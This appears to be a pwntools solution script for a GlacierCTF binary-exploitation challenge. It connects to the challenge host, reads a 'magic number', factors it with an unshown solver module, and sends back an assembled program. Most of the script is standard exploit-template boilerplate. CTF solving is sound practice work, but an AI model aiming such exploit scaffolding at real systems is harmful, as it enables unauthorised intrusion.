#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import solver

context.update(arch='i386')

host = args.HOST or 'pwn.glacierctf.com'
port = int(args.PORT or 13371)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil(b"Magic Number: ")
prime = int(io.recvline().decode("ascii"))
p, s = solver.getEasyFactors(prime)
s += "DONE\n"

#print(len(s.split("\n")))
assembled = solver.asm(s)
io.sendline(assembled)
print(io.recvall())



